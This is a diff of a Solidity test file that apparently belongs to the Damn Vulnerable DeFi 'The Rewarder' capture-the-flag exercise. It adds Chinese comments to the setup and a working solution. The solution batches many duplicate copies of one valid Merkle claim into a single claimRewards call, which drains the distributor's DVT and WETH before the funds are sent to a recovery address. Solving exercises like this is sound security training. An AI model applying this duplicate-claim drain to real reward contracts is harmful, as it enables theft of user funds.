@@ -54,20 +54,25 @@ contract TheRewarderChallenge is Test {
         weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();
 
         // Calculate roots for DVT and WETH distributions
-        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
-        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");   // 包含多个叶子：{地址,数量}
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json"); // 包含多个叶子：{地址,数量}
+        // 生成默克尔树，merkle是无状态的
         merkle = new Merkle();
-        dvtRoot = merkle.getRoot(dvtLeaves);
+        // 生成不同的两个merkle树
+        dvtRoot = merkle.getRoot(dvtLeaves); // getRoot 是 pure 的
         wethRoot = merkle.getRoot(wethLeaves);
 
         // Deploy distributor
+        // 部署分发器合约
         distributor = new TheRewarderDistributor();
 
+
         // Create DVT distribution
+        // 创建两种代币的分发批次，授权给合约进行分发
         dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
             token: IERC20(address(dvt)),
-            newRoot: dvtRoot,
+            newRoot: dvtRoot, 
             amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
         });
 
@@ -87,6 +92,7 @@ contract TheRewarderChallenge is Test {
         tokensToClaim[1] = IERC20(address(weth));
 
         // Create Alice's claims
+        // 创建 Alice 的领取凭证
         Claim[] memory claims = new Claim[](2);
 
         // First, the DVT claim
@@ -94,7 +100,7 @@ contract TheRewarderChallenge is Test {
             batchNumber: 0, // claim corresponds to first DVT batch
             amount: ALICE_DVT_CLAIM_AMOUNT,
             tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
-            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
+            proof: merkle.getProof(dvtLeaves, 2) // 获取第二个地址的 proof | Alice's address is at index 2
         });
 
         // And then, the WETH claim
@@ -102,16 +108,17 @@ contract TheRewarderChallenge is Test {
             batchNumber: 0, // claim corresponds to first WETH batch
             amount: ALICE_WETH_CLAIM_AMOUNT,
             tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
-            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
+            proof: merkle.getProof(wethLeaves, 2) // 获取第二个地址的 proof | Alice's address is at index 2
         });
 
         // Alice claims once
         vm.startPrank(alice);
+        // alice调用claimRewards一次性领取两种Token
         distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
 
         // Alice cannot claim twice
         vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
-        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim}); // 此次会失败
         vm.stopPrank(); // stop alice prank
 
         vm.stopPrank(); // stop deployer prank
@@ -148,7 +155,55 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // player: 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        // 查json文件
+        uint256 PLAY_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAY_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");   // 包含多个叶子：{地址,数量}
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json"); // 包含多个叶子：{地址,数量}
+         
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAY_DVT_CLAIM_AMOUNT;
+        // uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAY_WETH_CLAIM_AMOUNT;
+
+        // 计算要掏空这两种币，需要多少笔交易
+        // dvt交易数量
+        uint256 dvtTxCount = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT) / PLAY_DVT_CLAIM_AMOUNT;
+        // weth交易数量
+        uint256 wethTxCount = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / PLAY_WETH_CLAIM_AMOUNT;
+        // 总交易数
+        uint256 totalTxCount = dvtTxCount + wethTxCount;
+        console.log("dvtTxCount: ", dvtTxCount);
+        console.log("wethTxCount: ", wethTxCount);
+
+        Claim[] memory claims = new Claim[](totalTxCount);
+
+        for(uint256 i = 0; i < totalTxCount; i++) {
+            if (i < dvtTxCount) { // dvt txs
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: PLAY_DVT_CLAIM_AMOUNT,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188)
+                });
+            } else {  // weth txs
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: PLAY_WETH_CLAIM_AMOUNT,
+                    tokenIndex: 1, 
+                    proof: merkle.getProof(wethLeaves, 188)
+                });
+            }
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        // 转给 recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -179,11 +234,15 @@ contract TheRewarderChallenge is Test {
 
     // Utility function to read rewards file and load it into an array of leaves
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
+        // 使用 Foundry cheetcode：
+        // - 加载文件
+        // - 解析json
         Reward[] memory rewards =
             abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
+        // 生成
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
